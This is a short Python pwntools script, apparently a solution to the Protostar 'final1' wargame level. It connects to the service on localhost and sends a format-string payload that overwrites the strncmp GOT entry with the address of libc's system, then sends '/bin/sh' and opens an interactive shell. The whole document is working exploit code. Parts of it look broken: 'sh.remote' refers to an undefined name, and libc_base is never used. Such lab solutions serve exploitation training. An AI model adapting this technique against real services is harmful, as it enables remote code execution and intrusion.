#!/usr/bin/python
from pwn import *
from ssh import *
binarypath='/opt/protostar/bin/final1'
p=sh.remote('localhost',2994)
libc_base=0xb7e97000
system= 0xb7ecffb0
strncmp_got=0x804a1a8
p.sendlineafter('[final1] $ ','username A'+p32(strncmp_got)+p32(strncmp_got+2)+'%0'+str(0xffb0-5-31-4)+"x"+'%15$n'+'%'+str(0x1b7ec-0xffb0)+'x'+'%16$n')
p.sendlineafter('[final1] $ ','login hello')
p.sendlineafter('[final1] $ ','/bin/sh')
p.interactive()